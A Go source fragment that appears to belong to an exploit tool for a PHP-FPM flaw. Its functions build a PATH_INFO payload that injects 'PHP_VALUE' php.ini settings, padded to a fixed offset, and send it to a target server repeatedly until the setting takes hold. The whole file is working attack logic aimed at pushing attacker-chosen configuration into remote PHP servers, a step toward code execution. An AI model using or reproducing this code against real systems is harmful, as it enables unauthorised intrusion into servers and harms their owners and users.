package main

import (
	"fmt"
	"log"
	"net/http"
	"strings"
)

func MakePathInfo(phpValue string) (string, error) {
	pi := "/PHP_VALUE\n" + phpValue
	if len(pi) > PosOffset {
		return "", fmt.Errorf("php.ini value is too long: %#v", phpValue)
	}
	return pi + strings.Repeat(";", PosOffset-len(pi)), nil
}

func SetSetting(requester *Requester, params *AttackParams, setting string, tries int) error {
	log.Printf("Trying to set %#v...", setting)
	for i := 0; i < tries; i++ {
		if _, _, err := SetSettingSingle(requester, params, setting, ""); err != nil {
			return fmt.Errorf("error while setting %#v: %v", setting, err)
		}
	}
	return nil
}

func SetSettingSingle(requester *Requester, params *AttackParams, setting, queryStringPrefix string) (*http.Response, []byte, error) {
	payload, err := MakePathInfo(setting)
	if err != nil {
		return nil, nil, err
	}
	return requester.RequestWithQueryStringPrefix(payload, params, queryStringPrefix)
}
